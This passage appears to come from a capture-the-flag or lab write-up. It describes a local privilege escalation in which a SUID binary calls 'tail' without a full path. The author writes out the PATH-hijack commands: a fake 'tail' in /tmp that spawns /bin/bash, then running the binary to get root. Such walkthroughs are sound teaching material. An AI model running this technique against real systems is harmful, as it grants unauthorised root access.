
![Strings on binary](https://marcorei7.files.wordpress.com/2021/06/strings-suid.png?w=472)

Here I saw, that the binary executed the `tail` command to show the content of the “/var/log/nginx/access.log” file. 

we notice that the `tail` binary is not running with full path

To exploit this, I went to the “/tmp” folder, created my own “tail” binary, added this one to the path and executed it again.

```bash
echo '/bin/bash' > tail
chmod 777 tail
export PATH=/tmp:$PATH
/home/joe/live_log
```

And with this I got root rights.